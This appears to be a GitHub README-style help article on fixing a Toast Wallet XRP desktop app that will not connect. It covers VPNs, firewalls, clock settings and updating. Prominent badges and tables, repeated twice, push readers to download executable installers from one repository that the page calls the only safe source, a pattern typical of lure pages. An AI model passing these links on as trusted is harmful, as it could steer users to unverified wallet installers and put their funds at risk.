<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet not connecting fix</h1>

<p align="center">What to check when balances will not load.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

If Toast Wallet will not load balances or connect, first install the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), then check your internet connection, firewall, VPN and the computer's date and time. An outdated build is the most common cause. Your XRP is safe on the XRP Ledger while you troubleshoot.

## 👀 You'll see this if

- Balances stay blank or show zero.
- Toast Wallet reports that it cannot connect.
- Sending fails because the app is offline.
- Everything worked before you changed networks, VPNs or security settings.

## 🤔 Why it happens

Toast Wallet reads balances and submits transactions through servers on the XRP Ledger network. To do that, it needs an internet connection that allows its traffic. Several things can get in the way: an old version built for older network conditions, a firewall or antivirus blocking the app, a VPN or corporate network filtering traffic, or a computer clock so far off that secure connections fail.

None of these affect your XRP. They only stop this copy of the app from seeing the ledger.

## 🧭 Before you start

Make sure other websites load normally on the same computer. Note whether you use a VPN, a work network, a firewall or a security suite. Keep your backup code nearby in case you need to reinstall.

## 🛠️ Fix: restore the connection

1. **Update first.** Remove the old program and install the current release following [update Toast Wallet to the latest version](https://github.com/Toast-Wallet/learn/blob/main/how-to/update-toast-wallet-to-latest-version.md).
2. **Restart.** Close Toast Wallet, restart the computer and open it again.
3. **Check the date and time.** Set your system clock to update automatically. A wrong clock breaks secure connections.
4. **Pause the VPN.** Temporarily disconnect the VPN and test again.
5. **Try another network.** A home network instead of a work or public network often helps, as those can block unusual traffic.
6. **Check the firewall.** Make sure your firewall or security suite allows Toast Wallet. Use the security software's own settings to allow the app, rather than switching protection off.
7. **Wait a little.** Brief network hiccups resolve themselves. Leave the app open for a few minutes.

## 🧩 Real-world example

A user installs Toast Wallet on a work laptop and sees no balance. At home, on their own Wi-Fi, the balance appears immediately. Their workplace network filtered the connection. They decide to keep the wallet on their personal computer instead, which is also safer for a wallet.

## ⚠️ Common mistakes

- Troubleshooting an outdated build instead of updating first.
- Disabling the whole firewall instead of allowing the app.
- Leaving the computer clock set to the wrong time zone or year.
- Downloading "network patches" offered online.

## 🔁 If that did not work

- **The app does not start at all.** See [Toast Wallet not opening fix](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-not-opening-fix.md).
- **It connects but the balance reads zero.** See [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md).
- **A specific payment is missing.** See [Toast Wallet transaction not showing](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-transaction-not-showing.md).
- **Nothing helps.** Report it publicly in the [Toast Wallet app repository](https://github.com/Toast-Wallet/core), with your system details and without secrets.

## 🛡️ Prevention

Keep Toast Wallet and your operating system up to date. Run the wallet on a personal computer and home network you control. Keep the system clock on automatic.

## 📝 Good to know

Connection problems can look alarming because the balance disappears from the screen. Remember that the balance shown is only a view of the ledger. When the view is blocked, nothing has happened to your XRP. Once the connection returns, the app simply reads the same information again.

It is also worth knowing that receiving XRP does not depend on your app being online. Others can send XRP to your address while your computer is switched off; the payment is recorded on the ledger and appears the next time Toast Wallet connects.

## 🔍 A closer look at firewalls and security suites

Security suites sometimes block programs they have not seen before from reaching the internet. They usually show a notification the first time, which is easy to dismiss by accident. If Toast Wallet cannot connect, open your security software and look for a list of blocked applications or recent alerts. Allowing Toast Wallet there is far safer than switching off the firewall altogether.

Before allowing the app, make sure the installed copy came from the official release and that the installer passed the checksum check. Allowing a fake installer through your firewall would be the worst possible outcome. When the source and checksum are confirmed, a single allow rule for Toast Wallet is all you need.

## 🗂️ Quick connection checklist

Latest version installed; computer restarted; date and time set automatically; VPN paused for a test; trying a home network; firewall allows Toast Wallet; app left open for a few minutes. If all seven are true and nothing loads, report the details publicly.

## 🧠 Remember

A wallet that cannot connect is a display problem, not a loss. Update, restart, check the clock, pause the VPN, allow the app in your firewall and try a home network. Most connection issues disappear by the second or third step.

## ❓ FAQ

<details>
<summary>Is my XRP at risk when the app is offline?</summary>

No. Your XRP stays on the XRP Ledger. Only the view in the app is affected.

</details>

<details>
<summary>Can I receive XRP while disconnected?</summary>

Yes. Payments to your address are recorded on the ledger and show when you reconnect.

</details>

<details>
<summary>Does a VPN make the wallet safer?</summary>

It can help privacy, but some VPNs interfere with connections. Test with and without it.

</details>

> [!WARNING]
> No "network fix" requires your words, passphrase, backup code or keys. Ignore anyone who says otherwise.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet not opening fix](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-not-opening-fix.md) | Steps when the app will not start or shows a blank window. |
| [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md) | Reasons a balance reads zero and how to confirm your XRP. |
| [Toast Wallet transaction not showing](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-transaction-not-showing.md) | Checks to run when a sent or received payment is missing. |
| [Update Toast Wallet to the latest version](https://github.com/Toast-Wallet/learn/blob/main/how-to/update-toast-wallet-to-latest-version.md) | Move from any older build to the current desktop release. |
